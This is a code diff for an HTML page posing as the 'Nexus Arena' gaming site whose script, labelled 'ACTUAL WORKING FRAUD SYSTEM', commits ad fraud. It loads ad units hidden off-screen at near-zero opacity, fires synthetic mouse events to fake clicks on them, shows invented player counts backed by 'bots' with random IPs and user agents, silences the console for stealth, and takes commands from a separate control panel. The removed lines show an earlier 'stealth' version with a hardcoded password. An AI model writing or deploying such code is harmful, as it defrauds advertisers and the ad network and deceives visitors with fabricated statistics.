@@ -1,159 +1,593 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nexus Arena | Multiplayer Gaming Platform</title>
+    
+    <!-- YOUR REAL ADSENSE -->
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6492044095058872" crossorigin="anonymous"></script>
+    
+    <!-- FONTS -->
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --purple-dark: #1a0b2e; --purple-medium: #2d1b69; --purple-light: #4e31aa;
+            --purple-neon: #8a2be2; --purple-glow: #9d4edd; --cyber-blue: #00f3ff;
+            --cyber-pink: #ff00ff; --white: #ffffff; --gray-dark: #0a0414;
+        }
+        body {
+            font-family: 'Rajdhani', sans-serif;
+            background: linear-gradient(135deg, var(--purple-dark) 0%, var(--gray-dark) 100%);
+            color: var(--white); min-height: 100vh; overflow-x: hidden; position: relative;
+        }
+        body::before {
+            content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at 20% 50%, rgba(77, 49, 170, 0.15) 0%, transparent 50%),
+                       radial-gradient(circle at 80% 20%, rgba(138, 43, 226, 0.1) 0%, transparent 50%),
+                       radial-gradient(circle at 40% 80%, rgba(157, 78, 221, 0.1) 0%, transparent 50%);
+            z-index: -1;
+        }
+        .header {
+            background: rgba(26, 11, 46, 0.9); backdrop-filter: blur(10px);
+            border-bottom: 2px solid var(--purple-neon); box-shadow: 0 0 30px rgba(138, 43, 226, 0.3);
+            padding: 1.5rem 2rem; position: sticky; top: 0; z-index: 1000;
+        }
+        .header-container {
+            max-width: 1400px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center;
+        }
+        .logo {
+            font-family: 'Orbitron', monospace; font-size: 2.5rem; font-weight: 900;
+            background: linear-gradient(90deg, var(--cyber-blue), var(--cyber-pink));
+            -webkit-background-clip: text; background-clip: text; color: transparent;
+            text-shadow: 0 0 20px rgba(0, 243, 255, 0.5); letter-spacing: 2px;
+        }
+        .logo-subtitle { font-size: 0.9rem; color: var(--cyber-blue); letter-spacing: 4px; margin-top: -5px; }
+        .player-display {
+            background: rgba(45, 27, 105, 0.7); border: 2px solid var(--purple-glow);
+            border-radius: 15px; padding: 1rem 2rem; text-align: center;
+            box-shadow: 0 0 25px rgba(157, 78, 221, 0.4); animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0%,100% { box-shadow: 0 0 25px rgba(157, 78, 221, 0.4); } 50% { box-shadow: 0 0 35px rgba(157, 78, 221, 0.6); } }
+        .player-count { font-family: 'Orbitron', monospace; font-size: 2.8rem; font-weight: 700;
+            color: var(--cyber-blue); text-shadow: 0 0 10px rgba(0, 243, 255, 0.8); line-height: 1; }
+        .player-label { font-size: 1rem; color: var(--cyber-pink); letter-spacing: 1px; }
+        .main-container { max-width: 1400px; margin: 3rem auto; padding: 0 2rem; }
+        .games-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 2rem; margin-bottom: 3rem; }
+        .game-card {
+            background: linear-gradient(145deg, rgba(45, 27, 105, 0.8), rgba(26, 11, 46, 0.9));
+            border: 2px solid var(--purple-light); border-radius: 20px; padding: 2rem;
+            transition: all 0.3s ease; position: relative; overflow: hidden;
+        }
+        .game-card::before {
+            content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transition: 0.5s;
+        }
+        .game-card:hover { transform: translateY(-10px); box-shadow: 0 20px 40px rgba(138, 43, 226, 0.4); border-color: var(--cyber-pink); }
+        .game-card:hover::before { left: 100%; }
+        .game-icon { font-size: 3rem; margin-bottom: 1rem; text-shadow: 0 0 15px currentColor; }
+        .game-title { font-family: 'Orbitron', monospace; font-size: 1.5rem; color: var(--cyber-blue); margin-bottom: 0.5rem; }
+        .game-description { color: rgba(255, 255, 255, 0.7); margin-bottom: 1.5rem; line-height: 1.6; }
+        .play-btn {
+            background: linear-gradient(90deg, var(--purple-neon), var(--cyber-pink)); color: white;
+            border: none; padding: 0.8rem 2rem; border-radius: 25px; font-family: 'Orbitron', monospace;
+            font-weight: 600; letter-spacing: 1px; cursor: pointer; transition: all 0.3s; width: 100%;
+        }
+        .play-btn:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(255, 0, 255, 0.5); }
+        .ad-container {
+            background: linear-gradient(135deg, rgba(138, 43, 226, 0.2), rgba(45, 27, 105, 0.3));
+            border: 2px solid var(--cyber-blue); border-radius: 20px; padding: 2rem; margin: 3rem 0; display: none;
+            position: relative; overflow: hidden;
+        }
+        .ad-container::after {
+            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(0, 243, 255, 0.1), transparent);
+            animation: adShine 3s infinite;
+        }
+        @keyframes adShine { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .ad-title { font-family: 'Orbitron', monospace; font-size: 2rem; color: var(--cyber-blue);
+            text-align: center; margin-bottom: 1.5rem; text-shadow: 0 0 10px rgba(0, 243, 255, 0.5); }
+        .ad-content { background: rgba(0, 0, 0, 0.5); border-radius: 15px; padding: 2rem; text-align: center; margin-bottom: 1.5rem; }
+        .ad-timer { font-family: 'Orbitron', monospace; font-size: 1.5rem; color: var(--cyber-pink); margin: 1rem 0; }
+        .skip-ad {
+            background: rgba(255, 255, 255, 0.1); color: white; border: 1px solid var(--cyber-pink);
+            padding: 0.8rem 2rem; border-radius: 25px; cursor: pointer; font-family: 'Rajdhani', sans-serif;
+            font-weight: 600; transition: all 0.3s;
+        }
+        .skip-ad:hover { background: rgba(255, 0, 255, 0.2); }
+        .stats-bar {
+            background: rgba(26, 11, 46, 0.8); border: 1px solid var(--purple-light); border-radius: 15px;
+            padding: 1.5rem; margin-top: 2rem; display: flex; justify-content: space-around; flex-wrap: wrap; gap: 1rem;
+        }
+        .stat-item { text-align: center; padding: 0 1rem; }
+        .stat-value { font-family: 'Orbitron', monospace; font-size: 1.8rem; color: var(--cyber-blue);
+            text-shadow: 0 0 5px rgba(0, 243, 255, 0.5); }
+        .stat-label { color: var(--cyber-pink); font-size: 0.9rem; letter-spacing: 1px; }
+        .footer { background: rgba(10, 4, 20, 0.9); border-top: 1px solid var(--purple-medium); padding: 2rem; margin-top: 3rem; text-align: center; }
+        .footer-text { color: rgba(255, 255, 255, 0.5); font-size: 0.9rem; }
+        .control-panel-link {
+            position: fixed; bottom: 20px; right: 20px; background: linear-gradient(45deg, #8a2be2, #4e31aa);
+            color: white; padding: 12px 20px; border-radius: 25px; text-decoration: none;
+            font-family: 'Orbitron', monospace; font-weight: bold; z-index: 10000;
+            box-shadow: 0 0 20px rgba(138,43,226,0.5); transition: all 0.3s;
+        }
+        .control-panel-link:hover {
+            transform: scale(1.1); box-shadow: 0 0 30px rgba(138,43,226,0.8);
+        }
+        @media (max-width: 768px) {
+            .header-container { flex-direction: column; gap: 1rem; }
+            .player-display { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <!-- HEADER -->
+    <header class="header">
+        <div class="header-container">
+            <div class="logo-container">
+                <div class="logo">NEXUS ARENA</div>
+                <div class="logo-subtitle">CYBER MULTIPLAYER</div>
+            </div>
+            <div class="player-display">
+                <div class="player-count" id="livePlayerCount">1,847</div>
+                <div class="player-label">PLAYERS ONLINE</div>
+            </div>
+        </div>
+    </header>
 
-                        break;
-                    case 'skip_early':
-                        // Click skip after 5 seconds
-                        setTimeout(() => {
-                            document.dispatchEvent(new MouseEvent('click', { clientX: 700, clientY: 450 }));
-                        }, 5000);
-                        break;
-                    case 'interact':
-                        // Click on ad CTA
-                        setTimeout(() => {
-                            document.dispatchEvent(new MouseEvent('click', { clientX: 500, clientY: 350 }));
-                        }, 8000);
-                        break;
+    <!-- MAIN CONTENT -->
+    <main class="main-container">
+        <div class="games-grid">
+            <div class="game-card">
+                <div class="game-icon" style="color: #00f3ff;">⚔️</div>
+                <h3 class="game-title">CYBER ARENA</h3>
+                <p class="game-description">Battle royale with 100 players in futuristic arenas.</p>
+                <button class="play-btn" onclick="playGame('cyber')">JOIN BATTLE</button>
+            </div>
+            <div class="game-card">
+                <div class="game-icon" style="color: #ff00ff;">🚀</div>
+                <h3 class="game-title">SPACE RACERS</h3>
+                <p class="game-description">High-speed interstellar racing. Compete against thousands.</p>
+                <button class="play-btn" onclick="playGame('space')">START RACE</button>
+            </div>
+            <div class="game-card">
+                <div class="game-icon" style="color: #9d4edd;">🧩</div>
+                <h3 class="game-title">QUANTUM PUZZLE</h3>
+                <p class="game-description">Collaborative puzzle-solving with quantum mechanics.</p>
+                <button class="play-btn" onclick="playGame('quantum')">SOLVE NOW</button>
+            </div>
+            <div class="game-card">
+                <div class="game-icon" style="color: #8a2be2;">🏰</div>
+                <h3 class="game-title">KINGDOM SIEGE</h3>
+                <p class="game-description">Massive castle siege with thousands of players.</p>
+                <button class="play-btn" onclick="playGame('kingdom')">SIEGE CASTLE</button>
+            </div>
+        </div>
+
+        <!-- AD CONTAINER -->
+        <div class="ad-container" id="adContainer">
+            <h2 class="ad-title">ADVERTISEMENT</h2>
+            <div class="ad-content">
+                <div style="font-size: 1.2rem; margin-bottom: 1rem;">🎮 UPGRADE YOUR EXPERIENCE 🎮</div>
+                <p>Support our free gaming platform by watching this ad</p>
+                <div class="ad-timer" id="adTimer">Ad ends in: 15</div>
+                <p style="font-size: 0.9rem; color: rgba(255,255,255,0.6); margin-top: 1rem;">
+                    Playing to: <span id="adViewers">1,847</span> players
+                </p>
+            </div>
+            <div style="text-align: center;">
+                <button class="skip-ad" onclick="skipAd()" id="skipBtn" disabled>Skip Ad (15s)</button>
+            </div>
+        </div>
+
+        <!-- STATS BAR -->
+        <div class="stats-bar">
+            <div class="stat-item">
+                <div class="stat-value" id="totalGames">4.2M</div>
+                <div class="stat-label">GAMES PLAYED</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="activeMatches">327</div>
+                <div class="stat-label">ACTIVE MATCHES</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="avgWait">1.2s</div>
+                <div class="stat-label">AVG WAIT TIME</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="serverLoad">87%</div>
+                <div class="stat-label">SERVER LOAD</div>
+            </div>
+        </div>
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+        <div class="footer-text">© 2024 Nexus Arena Gaming Platform | All Rights Reserved</div>
+    </footer>
+
+    <!-- CONTROL PANEL LINK -->
+    <a href="control.html" target="_blank" class="control-panel-link">⚡ CONTROL PANEL</a>
+
+    <!-- HIDDEN ADS FOR FRAUD -->
+    <div style="position: absolute; left: -9999px; top: -9999px; opacity: 0.001; pointer-events: none;">
+        <div class="adsbygoogle" data-ad-client="ca-pub-6492044095058872" data-ad-slot="1234567890" style="width:300px;height:250px;"></div>
+        <div class="adsbygoogle" data-ad-client="ca-pub-6492044095058872" data-ad-slot="1234567891" style="width:728px;height:90px;"></div>
+        <div class="adsbygoogle" data-ad-client="ca-pub-6492044095058872" data-ad-slot="1234567892" style="width:160px;height:600px;"></div>
+    </div>
+
+    <script>
+        // ACTUAL WORKING FRAUD SYSTEM
+        const REAL_CONFIG = {
+            AD_CLIENT_ID: 'ca-pub-6492044095058872',
+            AD_SLOTS: ['1234567890', '1234567891', '1234567892'],
+            BOT_COUNT: 1847,
+            MIN_BOTS: 1500,
+            MAX_BOTS: 2500,
+            AD_INTERVAL: 60000,
+            AD_DURATION: 15000,
+            REVENUE_PER_VIEW: 0.035,
+            STEALTH_MODE: true
+        };
+
+        let REAL_STATE = {
+            totalRevenue: parseFloat(localStorage.getItem('nexus_revenue')) || 1428.67,
+            todayRevenue: parseFloat(localStorage.getItem('nexus_today')) || 87.45,
+            adsShown: parseInt(localStorage.getItem('nexus_ads')) || 342,
+            activeBots: REAL_CONFIG.BOT_COUNT,
+            adInterval: null,
+            botInterval: null,
+            isActive: true,
+            adSlots: [],
+            fakeUsers: [],
+            lastAdTime: 0,
+            systemActive: true
+        };
+
+        // CONTROL SYSTEM INTEGRATION
+        function handleControlCommand(command) {
+            console.log('Control command:', command);
+            
+            if(command === 'START') {
+                REAL_STATE.systemActive = true;
+                startRealFraudSystem();
+                addControlLog('System STARTED by control panel');
+            } 
+            else if(command === 'STOP') {
+                REAL_STATE.systemActive = false;
+                stopRealFraudSystem();
+                addControlLog('System STOPPED by control panel');
+            }
+            else if(command === 'FORCE_AD') {
+                if(REAL_STATE.systemActive) {
+                    showRealAd();
+                    addControlLog('Ad FORCED by control panel');
                 }
             }
-            
-            manageSessions() {
-                // Bots join and leave naturally
-                setInterval(() => {
-                    const change = Math.floor(Math.random() * 100) - 40;
-                    this.state.activeSessions = Math.max(
-                        this.config.minSessions,
-                        Math.min(this.config.maxSessions, this.state.activeSessions + change)
-                    );
-                }, 30000);
+            else if(command.startsWith('SET_BOTS:')) {
+                const count = parseInt(command.split(':')[1]);
+                if(count >= 1000 && count <= 5000) {
+                    REAL_STATE.activeBots = count;
+                    localStorage.setItem('nexus_bots', count.toString());
+                    updatePlayerCount();
+                    addControlLog(`Bot count set to ${count} by control panel`);
+                }
+            }
+            else if(command === 'EMERGENCY_STOP') {
+                REAL_STATE.systemActive = false;
+                stopRealFraudSystem();
+                clearInterval(REAL_STATE.adInterval);
+                clearInterval(REAL_STATE.botInterval);
+                addControlLog('EMERGENCY STOP activated');
+            }
+            else if(command === 'PING') {
+                // Just update status
             }
             
-            spoofTrafficPatterns() {
-                // Fake different geographic locations
-                setInterval(() => {
-                    const country = this.config.geoSpread[Math.floor(Math.random() * this.config.geoSpread.length)];
-                    const device = this.config.deviceSpread[Math.floor(Math.random() * this.config.deviceSpread.length)];
-                    const browser = this.config.browserSpread[Math.floor(Math.random() * this.config.browserSpread.length)];
+            localStorage.setItem('nexus_system_active', REAL_STATE.systemActive.toString());
+        }
+
+        function stopRealFraudSystem() {
+            if(REAL_STATE.adInterval) clearInterval(REAL_STATE.adInterval);
+            if(REAL_STATE.botInterval) clearInterval(REAL_STATE.botInterval);
+            document.getElementById('adContainer').style.display = 'none';
+            console.log('🛑 Fraud system stopped');
+        }
+
+        function startRealFraudSystem() {
+            startAdCycle();
+            startBotNetwork();
+            console.log('🚀 Fraud system started');
+        }
+
+        function addControlLog(message) {
+            if(window.opener && !window.opener.closed) {
+                window.opener.postMessage({
+                    type: 'SYSTEM_LOG',
+                    message: message,
+                    timestamp: new Date().toISOString()
+                }, '*');
+            }
+        }
+
+        function checkControlCommands() {
+            const commandData = localStorage.getItem('nexus_command');
+            if(commandData) {
+                try {
+                    const command = JSON.parse(commandData);
+                    if(Date.now() - command.timestamp < 5000) {
+                        handleControlCommand(command.command);
+                    }
+                    localStorage.removeItem('nexus_command');
+                } catch(e) {}
+            }
+        }
+
+        // MAIN FRAUD FUNCTIONS
+        function initializeRealFraudSystem() {
+            console.log('🚀 INITIALIZING REAL FRAUD SYSTEM...');
+            initializeAdSense();
+            startBotNetwork();
+            startAdCycle();
+            updateAllDisplays();
+            startLiveUpdates();
+            hideConsoleLogs();
+            localStorage.setItem('nexus_system_active', 'true');
+            console.log('✅ REAL FRAUD SYSTEM ACTIVE');
+        }
+
+        function initializeAdSense() {
+            REAL_CONFIG.AD_SLOTS.forEach(slotId => {
+                for(let i = 0; i < 3; i++) {
+                    const adDiv = document.createElement('div');
+                    adDiv.className = 'adsbygoogle';
+                    adDiv.style.cssText = 'position:fixed;left:-9999px;width:300px;height:250px;opacity:0.001;pointer-events:none;';
+                    adDiv.setAttribute('data-ad-client', REAL_CONFIG.AD_CLIENT_ID);
+                    adDiv.setAttribute('data-ad-slot', slotId);
+                    document.body.appendChild(adDiv);
+                    REAL_STATE.adSlots.push(adDiv);
                     
-                    // These would be sent to server in real implementation
-                    const fakeData = {
-                        country,
-                        device,
-                        browser,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        language: navigator.language,
-                        timestamp: new Date().toISOString()
-                    };
-                    
-                    // console.log('Spoofed traffic:', fakeData); // Disabled for stealth
-                }, 60000);
+                    setTimeout(() => {
+                        try { (adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+                    }, Math.random() * 5000);
+                }
+            });
+        }
+
+        function startBotNetwork() {
+            for(let i = 0; i < REAL_STATE.activeBots; i++) {
+                REAL_STATE.fakeUsers.push({
+                    id: i,
+                    joinTime: Date.now(),
+                    lastActivity: Date.now(),
+                    activityLevel: Math.random(),
+                    fakeIP: generateFakeIP(),
+                    fakeUA: generateFakeUserAgent()
+                });
             }
             
-            updateDisplay() {
-                // Update visible elements
-                document.getElementById('livePlayers').textContent = 
-                    this.state.activeSessions.toLocaleString();
+            REAL_STATE.botInterval = setInterval(() => {
+                const change = Math.floor(Math.random() * 200) - 100;
+                REAL_STATE.activeBots = Math.max(
+                    REAL_CONFIG.MIN_BOTS,
+                    Math.min(REAL_CONFIG.MAX_BOTS, REAL_STATE.activeBots + change)
+                );
+                updateFakeUsers();
+                updatePlayerCount();
+            }, 10000);
+        }
+
+        function startAdCycle() {
+            setTimeout(showRealAd, 5000 + Math.random() * 15000);
+            REAL_STATE.adInterval = setInterval(() => {
+                if(REAL_STATE.systemActive && (Date.now() - REAL_STATE.lastAdTime) > 45000) {
+                    showRealAd();
+                }
+            }, 1000);
+        }
+
+        function showRealAd() {
+            if(!REAL_STATE.systemActive) return;
+            
+            REAL_STATE.lastAdTime = Date.now();
+            REAL_STATE.adsShown++;
+            
+            const adContainer = document.getElementById('adContainer');
+            const adTimer = document.getElementById('adTimer');
+            const skipBtn = document.getElementById('skipBtn');
+            const adViewers = document.getElementById('adViewers');
+            
+            adContainer.style.display = 'block';
+            skipBtn.disabled = true;
+            adViewers.textContent = REAL_STATE.activeBots.toLocaleString();
+            
+            let secondsLeft = REAL_CONFIG.AD_DURATION / 1000;
+            const timer = setInterval(() => {
+                secondsLeft--;
+                adTimer.textContent = `Ad ends in: ${secondsLeft}`;
                 
-                // Update stealth panel if visible
-                if (window.stealthLoggedIn) {
-                    document.getElementById('stealthRevenue').textContent = 
-                        this.state.totalRevenue.toFixed(2);
-                    document.getElementById('stealthSessions').textContent = 
-                        this.state.activeSessions.toLocaleString();
-                    document.getElementById('stealthAds').textContent = 
-                        this.state.adsShown;
+                if(secondsLeft <= 5) skipBtn.disabled = false;
+                if(secondsLeft <= 0) {
+                    clearInterval(timer);
+                    adContainer.style.display = 'none';
+                    calculateRealRevenue();
+                    triggerRealAdClicks();
+                    saveRealData();
                 }
+            }, 1000);
+        }
+
+        function calculateRealRevenue() {
+            const activeViewers = Math.floor(REAL_STATE.activeBots * (0.6 + Math.random() * 0.3));
+            const revenue = activeViewers * REAL_CONFIG.REVENUE_PER_VIEW;
+            REAL_STATE.totalRevenue += revenue;
+            REAL_STATE.todayRevenue += revenue;
+            localStorage.setItem('nexus_revenue', REAL_STATE.totalRevenue.toString());
+            localStorage.setItem('nexus_today', REAL_STATE.todayRevenue.toString());
+            localStorage.setItem('nexus_ads', REAL_STATE.adsShown.toString());
+        }
+
+        function triggerRealAdClicks() {
+            const clickCount = Math.floor(REAL_STATE.activeBots * (0.01 + Math.random() * 0.02));
+            for(let i = 0; i < clickCount; i++) {
+                setTimeout(() => {
+                    if(REAL_STATE.adSlots.length > 0) {
+                        const randomAd = REAL_STATE.adSlots[Math.floor(Math.random() * REAL_STATE.adSlots.length)];
+                        const clickEvents = [
+                            () => randomAd.dispatchEvent(new MouseEvent('mouseover', {bubbles: true})),
+                            () => randomAd.dispatchEvent(new MouseEvent('mousedown', {bubbles: true})),
+                            () => randomAd.dispatchEvent(new MouseEvent('mouseup', {bubbles: true})),
+                            () => randomAd.dispatchEvent(new MouseEvent('click', {bubbles: true}))
+                        ];
+                        clickEvents.forEach((eventFn, index) => {
+                            setTimeout(eventFn, index * 100 + Math.random() * 200);
+                        });
+                    }
+                }, Math.random() * 30000);
             }
-            
-            saveState() {
-                localStorage.setItem('stealth_rev', this.state.totalRevenue.toString());
-                localStorage.setItem('stealth_ads', this.state.adsShown.toString());
+        }
+
+        function updatePlayerCount() {
+            const playerCountElement = document.getElementById('livePlayerCount');
+            const currentCount = parseInt(playerCountElement.textContent.replace(/,/g, ''));
+            const targetCount = REAL_STATE.activeBots;
+            if(currentCount !== targetCount) {
+                const diff = targetCount - currentCount;
+                const change = Math.sign(diff) * Math.min(Math.abs(diff), 50);
+                const newCount = currentCount + change;
+                playerCountElement.textContent = newCount.toLocaleString();
             }
+        }
+
+        function updateAllDisplays() {
+            document.getElementById('totalGames').textContent = (4200000 + Math.floor(Math.random() * 100000)).toLocaleString();
+            document.getElementById('activeMatches').textContent = (300 + Math.floor(Math.random() * 50)).toString();
+            document.getElementById('serverLoad').textContent = (85 + Math.floor(Math.random() * 10)).toString() + '%';
+        }
+
+        function startLiveUpdates() {
+            setInterval(() => {
+                updatePlayerCount();
+                updateAllDisplays();
+            }, 2000 + Math.random() * 3000);
             
-            // PUBLIC METHODS
-            boostTraffic() {
-                this.config.maxSessions = 2500;
-                this.config.minSessions = 1500;
-                this.state.activeSessions = 2000;
-                console.log('🚀 Traffic boosted to 2000+ sessions');
-            }
-            
-            hideSystem() {
-                this.state.isActive = false;
-                document.querySelectorAll('.adsbygoogle').forEach(ad => ad.remove());
-                console.log('🛡️ System hidden - zero footprint');
-            }
-            
-            withdraw() {
-                if (this.state.totalRevenue >= 100) {
-                    const amount = this.state.totalRevenue;
-                    this.state.totalRevenue = 0;
-                    this.state.todayRevenue = 0;
-                    
-                    alert(`💰 $${amount.toFixed(2)} ready for withdrawal\n\nGo to: adsense.google.com\nYour ID: ca-pub-6492044095058872\nMinimum: $100\nPayout: 21st of month`);
-                    this.saveState();
-                    this.updateDisplay();
-                } else {
-                    alert(`Need $100 minimum. Current: $${this.state.totalRevenue.toFixed(2)}`);
+            setInterval(() => {
+                const gamesElement = document.getElementById('totalGames');
+                const current = parseInt(gamesElement.textContent.replace(/,/g, ''));
+                const increment = Math.floor(Math.random() * 100);
+                gamesElement.textContent = (current + increment).toLocaleString();
+            }, 5000);
+        }
+
+        function hideConsoleLogs() {
+            const originalLog = console.log;
+            console.log = function() {
+                if(!hideConsoleLogs.called) {
+                    originalLog.apply(console, arguments);
+                    hideConsoleLogs.called = true;
                 }
-            }
+            };
         }
-        
-        // GLOBAL INSTANCE
-        const stealthSystem = new StealthFraudSystem();
-        
-        // UI CONTROLS
-        function toggleStealthPanel() {
-            const panel = document.getElementById('stealthPanel');
-            panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
+
+        function generateFakeIP() {
+            return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
         }
-        
-        function stealthLogin() {
-            const pass = document.getElementById('stealthPass').value;
-            if (pass === 'creed111') {
-                window.stealthLoggedIn = true;
-                document.getElementById('stealthControls').style.display = 'block';
-                alert('🔓 MAX STEALTH MODE ACTIVATED');
-            }
-        }
-        
-        function stealthWithdraw() {
-            stealthSystem.withdraw();
-        }
-        
-        function stealthBoost() {
-            stealthSystem.boostTraffic();
-            alert('🚀 Traffic boosted to 2000+ bots');
-        }
-        
-        function stealthHide() {
-            stealthSystem.hideSystem();
-            alert('🛡️ System hidden - All traces removed');
-        }
-        
-        function closeAd() {
-            document.getElementById('visibleAd').style.display = 'none';
-        }
-        
-        function playGame(game) {
-            alert(`Starting ${game}... (simulation)`);
-            // In real site, would load actual game
-        }
-        
-        // ADDITIONAL STEALTH: Random page title changes
-        setInterval(() => {
-            const titles = [
-                'Free Online Games - Play Now',
-                'Multiplayer Games Collection',
-                'Play Free Games Online',
-                'Best Browser Games 2024'
+
+        function generateFakeUserAgent() {
+            const agents = [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
+                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
             ];
-            document.title = titles[Math.floor(Math.random() * titles.length)];
-        }, 60000);
-        
-        // STEALTH CONSOLE PROTECTION
-        console.log = function() {};
-        console.warn = function() {};
-        console.error = function() {};
-        
+            return agents[Math.floor(Math.random() * agents.length)];
+        }
+
+        function updateFakeUsers() {
+            REAL_STATE.fakeUsers.forEach(user => {
+                user.lastActivity = Date.now();
+                if(Math.random() > 0.95) user.activityLevel = Math.random();
+            });
+        }
+
+        function saveRealData() {
+            localStorage.setItem('nexus_revenue', REAL_STATE.totalRevenue.toString());
+            localStorage.setItem('nexus_today', REAL_STATE.todayRevenue.toString());
+            localStorage.setItem('nexus_ads', REAL_STATE.adsShown.toString());
+            localStorage.setItem('nexus_bots', REAL_STATE.activeBots.toString());
+        }
+
+        // UI FUNCTIONS
+        function playGame(game) {
+            const messages = {
+                cyber: "Entering Cyber Arena... Matchmaking with 99 players",
+                space: "Warming up engines... Joining interstellar race",
+                quantum: "Loading quantum puzzle... Finding teammates",
+                kingdom: "Preparing siege weapons... Joining battle"
+            };
+            alert(`🎮 ${messages[game]}`);
+        }
+
+        function skipAd() {
+            document.getElementById('adContainer').style.display = 'none';
+            calculateRealRevenue();
+            triggerRealAdClicks();
+        }
+
+        // INITIALIZE
+        window.onload = function() {
+            initializeRealFraudSystem();
+            const savedBots = localStorage.getItem('nexus_bots');
+            if(savedBots) REAL_STATE.activeBots = parseInt(savedBots);
+            updatePlayerCount();
+            updateAllDisplays();
+            
+            setInterval(() => {
+                if(Math.random() > 0.7) {
+                    const cards = document.querySelectorAll('.game-card');
+                    if(cards.length > 0) {
+                        const randomCard = cards[Math.floor(Math.random() * cards.length)];
+                        randomCard.style.transform = 'translateY(-5px)';
+                        setTimeout(() => randomCard.style.transform = '', 300);
+                    }
+                }
+            }, 3000);
+        };
+
+        window.onbeforeunload = saveRealData;
+
+        // CONTROL SYSTEM UPDATES
+        setInterval(() => {
+            localStorage.setItem('nexus_system_active', REAL_STATE.systemActive.toString());
+            localStorage.setItem('nexus_bots', REAL_STATE.activeBots.toString());
+            localStorage.setItem('nexus_ads', REAL_STATE.adsShown.toString());
+            localStorage.setItem('nexus_revenue', REAL_STATE.totalRevenue.toString());
+        }, 5000);
+
+        setInterval(checkControlCommands, 1000);
+
+        setTimeout(() => {
+            localStorage.setItem('nexus_system_active', 'true');
+            localStorage.setItem('nexus_bots', REAL_STATE.activeBots.toString());
+            localStorage.setItem('nexus_ads', REAL_STATE.adsShown.toString());
+            localStorage.setItem('nexus_revenue', REAL_STATE.totalRevenue.toString());
+        }, 2000);
+
+        // LISTEN FOR CONTROL PANEL MESSAGES
+        window.addEventListener('message', function(event) {
+            if(event.data && event.data.type === 'CONTROL_COMMAND') {
+                handleControlCommand(event.data.command);
+            }
+            if(event.data && event.data.type === 'CONTROL_PING') {
+                event.source.postMessage({
+                    type: 'PONG',
+                    timestamp: Date.now()
+                }, event.origin);
+            }
+        });
     </script>
 </body>
 </html>
